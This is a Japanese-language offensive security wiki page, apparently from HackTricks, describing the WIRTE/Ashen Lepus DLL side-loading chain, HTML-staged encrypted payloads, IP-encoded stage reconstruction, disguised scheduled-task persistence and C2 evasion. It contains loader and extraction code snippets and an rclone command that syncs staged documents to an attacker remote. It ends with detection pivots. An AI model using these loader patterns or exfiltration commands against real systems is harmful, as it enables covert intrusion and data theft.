# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) は、DLL sideloading、staged HTML payloads、そして modular .NET backdoors を連鎖させる再現可能なパターンを weaponized し、中東の外交ネットワーク内に persistence するために使った。この technique は以下に依存しているため、どの operator でも再利用できる。

- **Archive-based social engineering**: 無害な PDF が、file-sharing site から RAR archive を取得するよう target に指示する。archive には、本物らしい document viewer EXE、信頼された library にちなんだ名前の悪性 DLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、そして decoy の `Document.pdf` が含まれている。
- **DLL search order abuse**: victim が EXE をダブルクリックすると、Windows は current directory から DLL import を解決し、悪性 loader（AshenLoader）が trusted process 内で実行される一方、decoy PDF が開いて不審を避ける。
- **Living-off-the-land staging**: 以降のすべての stage（AshenStager → AshenOrchestrator → modules）は、必要になるまで disk 上に置かれず、無害に見える HTML response 内に隠された encrypted blobs として配信される。

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE が AshenLoader を side-load し、host recon を実行して AES-CTR で encrypt し、`token=`, `id=`, `q=`, `auth=` のような rotating parameters を使って、`/api/v2/account` のような API 風の path に POST する。
2. **HTML extraction**: C2 は client IP が target region に geolocate され、`User-Agent` が implant と一致した場合にのみ次の stage を明かし、sandbox を困らせる。チェックを通過すると、HTTP body には Base64/AES-CTR encrypted AshenStager payload を含む `<headerp>...</headerp>` blob が入る。
3. **Second sideload**: AshenStager は `wtsapi32.dll` を import する別の legitimate binary と一緒に deploy される。binary に inject された malicious copy はさらに HTML を取得し、今度は `<article>...</article>` を切り出して AshenOrchestrator を復元する。
4. **AshenOrchestrator**: Base64 JSON config を decode する modular .NET controller。config の `tg` と `au` フィールドは連結/hashed されて AES key になり、それが `xrk` を decrypt する。得られた bytes は、その後に取得されるすべての module blob に対する XOR key として機能する。
5. **Module delivery**: 各 module は HTML comments を通じて記述され、parser を任意の tag へ誘導し、`<headerp>` や `<article>` だけを見る static rules を破る。modules には persistence (`PR*`)、uninstallers (`UN*`)、reconnaissance (`SN`)、screen capture (`SCT`)、file exploration (`FE`) が含まれる。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
防御側が特定の要素をブロックまたは削除しても、オペレーターはHTMLコメント内で示されたタグを変更するだけで配信を再開できます。

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

最近のHTML smuggling研究（Talos）は、HTML添付ファイル内の `<script>` ブロックにBase64文字列としてpayloadを隠し、実行時にJavaScriptでデコードする手法を強調している。同じトリックはC2 responsesにも再利用できる。つまり、script tag（または他のDOM要素）内に暗号化されたblobをstageし、AES/XORの前にメモリ内でデコードすることで、ページを通常のHTMLのように見せられる。Talosはまた、script tags内での多層的な難読化（identifier renamingに加えてBase64/Caesar/AES）も示しており、これはHTML-staged C2 blobsにそのまま対応する。後続のTalosの **hidden text salting** に関する解説もここで関連する。無関係なHTML commentsやwhitespaceでBase64を分割するだけで、browser側での再構成は簡単なまま、単純なregex extractorを壊せる。

## Recent Variant Notes (2024-2025)

- Check Pointは2024年のWIRTE campaignsで、依然としてarchive-based sideloadingに依存しつつ、最初のstageとして `propsys.dll`（stagerx64）を使っていたことを観測した。stagerはBase64 + XOR（key `53`）で次のpayloadをデコードし、ハードコードされた `User-Agent` でHTTP requestsを送り、HTML tagsの間に埋め込まれた暗号化blobを抽出する。ある分岐では、`RtlIpv4StringToAddressA` でデコードされた埋め込みIP stringsの長いリストからstageを再構築し、それをpayload bytesへ連結していた。
- OWN-CERTは、より早期のWIRTE toolingについて、side-loadedされた `wtsapi32.dll` dropperがBase64 + TEAでstringsを保護し、DLL名そのものをdecryption keyとして使っていたこと、さらにC2へ送信する前にhost identification dataをXOR/Base64で難読化していたことを文書化している。

## Reconstructing IP-Encoded Stages

WIRTEの2024年の `propsys.dll` 分岐は、次のPEが1つの連続したHTML blobとして存在する必要はないことを示している。loaderはstage bytesをドット区切りのquad stringsとして隠し、`RtlIpv4StringToAddressA` で再構築できる。このパターンはHiveの **IPfuscation** tradecraftと密接に関連している。運用上これは、actorがHTML page内に明白なBase64 payloadではなく、無害に見えるIOCsやconfig dataのようなものを置きたい場合に有用である。
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
回収したバイト列が `MZ` で始まる場合、次の PE を直接再構築した可能性が高いです。そうでない場合は、先頭の XOR/Base64 レイヤーや、アドレス間にある小さな区切りチャンクを確認してください。

## Swappable DLL Names & Host Rotation

このパターンの強みは、**HTML/AES/XOR staging backend は同一のまま、sideload pair だけを変更できる**ことです。WIRTE はキャンペーンをまたいで `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`、`propsys.dll` をローテーションしており、これは次の理由で有用です。

- `propsys.dll` と `wtsapi32.dll` は、defenders が `%System32%` / `%SysWOW64%` に存在すると想定する、ごく普通の Windows DLL 名です。
- **HijackLibs** のような公開カタログには、コピーされたアプリケーションディレクトリからそれらの DLL 名をロードする多くのバイナリがすでに対応付けられており、オペレーターは stager を再設計せずに代替 host を得られます。
- host ごとに調整が必要なのは export surface だけです。HTML パーサー、AES/XOR ルーチン、module loader は通常、forwarding proxy DLL にそのまま移植できます。

offensive lab 作業では、問題を **(1) 選んだ DLL 名をローカルで解決する安定した signed host を見つける** ことと、**(2) その DLL の背後で同じ staged-HTML loader logic を再利用する** ことに分割できます。

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 現在の loaders は 256-bit keys と nonce（例: `{9a 20 51 98 ...}`）を埋め込み、必要に応じて `msasn1.dll` のような文字列を使った XOR レイヤーを復号の前後に追加します。
- **Key material variations**: 以前の loaders は、埋め込み文字列を保護するために Base64 + TEA を使い、復号鍵は悪意ある DLL 名（例: `wtsapi32.dll`）から導出していました。
- **Infrastructure split + subdomain camouflage**: staging servers はツールごとに分離され、異なる ASN にまたがってホストされ、場合によっては一見正規に見える subdomain を前面に出すため、1 つの stage が焼かれても他には波及しません。
- **Recon smuggling**: 列挙されたデータには Program Files の一覧が含まれるようになり、高価値アプリを見つけるために使われ、ホストを離れる前に必ず暗号化されます。
- **URI churn**: query parameters と REST paths はキャンペーンごとに変化します（`/api/v1/account?token=` → `/api/v2/account?auth=`）。これにより、脆弱な検知は無効化されます。
- **User-Agent pinning + safe redirects**: C2 infrastructure は完全一致の UA 文字列にのみ応答し、それ以外は無害な news/health site に redirect して紛れ込みます。
- **Gated delivery**: servers は geo-fence され、実際の implants にのみ応答します。未承認の clients には不審に見えない HTML が返されます。

## Persistence & Execution Loop

AshenStager は、Windows のメンテナンスジョブを装い、`svchost.exe` 経由で実行される scheduled tasks を配置します。例:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらの tasks は起動時または一定間隔で sideloading chain を再実行し、AshenOrchestrator が再び disk に触れることなく新しい modules を要求できるようにします。

## Using Benign Sync Clients for Exfiltration

オペレーターは専用 module を通じて外交文書を `C:\Users\Public`（世界中から読み取り可能で不審ではない）に staging し、その後、正規の [Rclone](https://rclone.org/) binary をダウンロードしてそのディレクトリを attacker storage と同期します。Unit42 は、これがこの actor による Rclone を exfiltration に使った初の観測であり、正規の sync tooling を悪用して通常の traffic に紛れ込むという広い傾向と一致すると指摘しています。

1. **Stage**: 対象ファイルを `C:\Users\Public\{campaign}\` にコピー/収集する。
2. **Configure**: attacker-controlled HTTPS endpoint（例: `api.technology-system[.]com`）を指す Rclone config を配布する。
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、traffic が通常の cloud backups のように見えるようにする。

Rclone は正規の backup workflows で広く使われているため、defenders は異常な実行（新しい binaries、奇妙な remotes、または `C:\Users\Public` の突然の同期）に注目する必要があります。

## Detection Pivots

- **signed processes** が user-writable paths から予期せず DLL を load した場合に alert する（Procmon filters + `Get-ProcessMitigation -Module`）。特に DLL 名が `netutils`、`srvcli`、`dwampi`、`wtsapi32`、`propsys` と重なる場合。
- 不審な HTTPS responses の中に、**珍しい tags 内に埋め込まれた大きな Base64 blob**、または `<!-- TAG: <xyz> -->` comments で保護されたものがないか確認する。
- まず HTML を正規化する: **Base64 extraction の前に comments を削除し whitespace を折りたたむ**。hidden-text-salting 型の回避は、payload を comment 境界にまたがって分割できるためです。
- HTML hunting を **`<script>` blocks 内の Base64 strings**（HTML smuggling-style staging）に拡張する。これらは AES/XOR 処理の前に JavaScript で decode されます。
- **`RtlIpv4StringToAddressA` の繰り返し呼び出しの後に buffer assembly が続く**ものを狙う。特に周囲の strings が実ネットワークの target ではなく、長い IPv4 lists になっている場合。
- non-service arguments で `svchost.exe` を実行する、または dropper directories を指す **scheduled tasks** を狙う。
- 完全一致の `User-Agent` strings にのみ payload を返し、それ以外は正規の news/health domains に bounce する **C2 redirects** を追跡する。
- IT-managed locations の外に現れる **Rclone** binaries、新しい `rclone.conf` files、または `C:\Users\Public` のような staging directories から pull する sync jobs を監視する。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
